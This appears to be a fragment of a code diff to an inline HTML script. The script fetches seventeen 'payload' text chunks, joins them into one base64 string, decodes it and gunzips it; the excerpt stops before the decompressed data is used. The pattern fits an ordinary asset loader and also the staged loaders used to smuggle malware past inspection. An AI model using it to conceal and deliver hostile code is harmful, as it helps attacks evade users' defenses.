@@ -12,7 +12,7 @@
 <script>
 (async()=>{
   try{
-    const urls=['payload-1.txt','payload-2.txt','payload-3.txt','payload-4.txt'];
+    const urls=Array.from({length:17},(_,i)=>`payload-${String(i+1).padStart(2,'0')}.txt`);
     const b64=(await Promise.all(urls.map(async u=>{const r=await fetch(u,{cache:'force-cache'});if(!r.ok)throw new Error(`${u}: ${r.status}`);return r.text()}))).join('');
     const bytes=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
     const stream=new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'));
